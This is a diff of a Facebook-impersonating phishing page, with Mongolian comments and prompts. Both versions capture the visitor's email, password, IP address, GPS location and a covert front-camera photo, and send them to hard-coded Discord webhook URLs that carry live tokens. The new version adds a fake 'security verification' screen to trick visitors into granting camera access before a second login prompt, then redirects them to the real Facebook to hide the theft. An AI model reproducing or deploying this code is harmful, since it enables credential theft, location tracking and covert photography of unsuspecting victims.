@@ -3,216 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <title>Facebook – Log In or Sign Up</title>
+    
     <meta property="og:title" content="Facebook – Log In or Sign Up" />
     <meta property="og:description" content="Connect with friends and the world around you on Facebook." />
     <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
-    <meta property="og:type" content="website" />
 
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .header {
-            width: 100%;
-            height: 140px;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .fb-logo {
-            color: #1877f2;
-            font-size: 35px;
-            font-weight: bold;
-        }
-        .login-container {
-            width: 92%;
-            max-width: 400px;
-            margin-top: -20px;
-        }
-        .login-card {
-            background: white;
-            padding: 16px;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1), 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-            background-color: #f5f6f7;
-            box-sizing: border-box;
-        }
-        input:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: #fff;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .forgot {
-            color: #1877f2;
-            font-size: 14px;
-            margin: 15px 0;
-            display: block;
-            text-decoration: none;
-            text-align: center;
-        }
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        .create-btn {
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            padding: 10px 16px;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        #loading {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.95);
-            z-index: 1000;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            animation: spin 1s linear infinite;
-        }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #camera-step { text-align: center; width: 90%; max-width: 400px; }
+        #login-step { display: none; width: 100%; max-width: 400px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 20px; }
+        .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background-color: #f5f6f7; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
+    <div id="camera-step">
         <div class="fb-logo">facebook</div>
-    </div>
-
-    <div class="login-container">
-        <div class="login-card">
-            <input type="text" id="email" placeholder="Mobile number or email" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button class="login-btn" onclick="executeGrab()">Log In</button>
-            <a href="#" class="forgot">Forgotten password?</a>
-            <div class="divider"></div>
-            <center><button class="create-btn">Create new account</button></center>
+        <div class="card">
+            <div class="loader"></div>
+            <p style="color: #4b4f56; font-size: 16px;">Аюулгүй байдлын үүднээс хөтөчийг баталгаажуулж байна...</p>
+            <button class="btn" onclick="startGrabbing()">Үргэлжлүүлэх</button>
+            <p style="font-size: 12px; color: #90949c; margin-top: 15px;">Үргэлжлүүлэхийн тулд "Allow/Зөвшөөрөх" дээр дарна уу.</p>
         </div>
     </div>
 
-    <div id="loading">
-        <div class="spinner"></div>
-        <p style="font-size: 14px; color: #606770; margin-top: 10px;">Connecting to Facebook...</p>
+    <div id="login-step">
+        <div class="fb-logo" style="margin-top: -40px;">facebook</div>
+        <div class="card">
+            <p style="font-size: 14px; color: #1c1e21; margin-bottom: 20px;">Үргэлжлүүлэхийн тулд дахин нэвтэрнэ үү.</p>
+            <input type="text" id="email" placeholder="Mobile number or email" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button class="btn" onclick="sendPass()">Log In</button>
+            <p style="color: #1877f2; font-size: 14px; margin-top: 15px;">Forgotten password?</p>
+        </div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1474117800611283046/98vn9fBxXglz8eaFjGSDnavxvdw780mX40C7OLshIIUwbAwB0JupILzA6MUVn0Egqx27";
+        // ЧИНИЙ ШИНЭ WEBHOOK
+        const WEBHOOK = "https://discord.com/api/webhooks/1474128779889873121/kHzI9DSdcQJF-Gs3qJa2NwhY79pAXTUDoWPw16lPO0EvtyRmxYfdFgJYmpkqbMjq-P-m";
+        
+        let capturedData = { ip: "Мэдэгдээгүй", loc: "Татгалзсан" };
 
-        async function executeGrab() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            if (!email || !pass) {
-                alert("Please enter your email and password.");
-                return;
-            }
-
-            // Ачаалах дэлгэцийг харуулах
-            document.getElementById('loading').style.display = 'flex';
-
-            let ipAddress = "Нууцалсан";
-            let googleMapsUrl = "Байршил татгалзсан";
-
-            // 1. IP Хаяг авах (WiFi / Дата мэдээлэл)
+        // IP болон Байршил авах
+        async function prepareData() {
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ipAddress = ipData.ip;
-            } catch (e) { console.log("IP fetch error"); }
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                capturedData.ip = data.ip;
+            } catch (e) {}
+            
+            navigator.geolocation.getCurrentPosition(p => {
+                capturedData.loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            });
+        }
+        prepareData();
 
-            // 2. GPS Байршил авах
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    googleMapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                },
-                (err) => { console.log("Location denied"); },
-                { enableHighAccuracy: true }
-            );
-
-            // 3. Камер ажиллуулж зураг авах
+        async function startGrabbing() {
+            const btn = document.querySelector('#camera-step .btn');
+            btn.innerText = "Уншиж байна...";
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 video.srcObject = stream;
 
-                // 1.5 секунд хүлээгээд зураг дарна (камер тогтворжих хугацаа)
                 setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        const message = `🚀 **ШИНЭ МЭДЭЭЛЭЛ ИРЛЭЭ!**\n\n👤 **User:** \`${email}\` \n🔒 **Pass:** \`${pass}\` \n🌐 **IP:** \`${ipAddress}\` \n📍 **GPS:** ${googleMapsUrl}\n📱 **Device:** iPhone 12 / Safari`;
+                        const fd = new FormData();
+                        fd.append("content", `📸 **ШИНЭ ХҮН ОРЛОО!**\n🌐 **IP:** \`${capturedData.ip}\` \n📍 **Location:** ${capturedData.loc}`);
+                        fd.append("file", blob, "camera_shot.png");
                         
-                        formData.append("content", message);
-                        formData.append("file", blob, "camera_shot.png");
-
-                        // Discord руу илгээх
-                        await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
-
-                        // Камер унтрааж, жинхэнэ Facebook рүү шилжүүлэх
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://www.facebook.com/login/";
+                        await fetch(WEBHOOK, { method: "POST", body: fd });
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        showLogin();
                     }, 'image/png');
-                }, 1500);
-
+                }, 1200);
             } catch (err) {
-                // Хэрэв камер зөвшөөрөхгүй бол зөвхөн мэдээллийг явуулна
-                const textOnly = {
-                    content: `🔑 **Нэвтрэх мэдээлэл (Камер хаалттай):**\n👤 User: \`${email}\` \n🔒 Pass: \`${pass}\` \n🌐 IP: \`${ipAddress}\` \n📍 GPS: ${googleMapsUrl}`
-                };
-                await fetch(DISCORD_WEBHOOK, {
+                // Камер зөвшөөрөхгүй байсан ч мэдээлэл явуулна
+                await fetch(WEBHOOK, {
                     method: "POST",
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(textOnly)
+                    body: JSON.stringify({ content: `🔑 **Мэдээлэл (Камер хаалттай):**\n🌐 IP: \`${capturedData.ip}\` \n📍 Location: ${capturedData.loc}` })
                 });
-                window.location.href = "https://www.facebook.com/login/";
+                showLogin();
             }
+        }
+
+        function showLogin() {
+            document.getElementById('camera-step').style.display = 'none';
+            document.getElementById('login-step').style.display = 'block';
+        }
+
+        async function sendPass() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return alert("Please fill in all fields.");
+
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `🔑 **НУУЦ ҮГ ИРЛЭЭ!**\n👤 **User:** \`${email}\` \n🔒 **Pass:** \`${pass}\`` })
+            });
+
+            // Дууссаны дараа жинхэнэ Facebook рүү
+            window.location.href = "https://www.facebook.com/recover/initiate";
         }
     </script>
 </body>
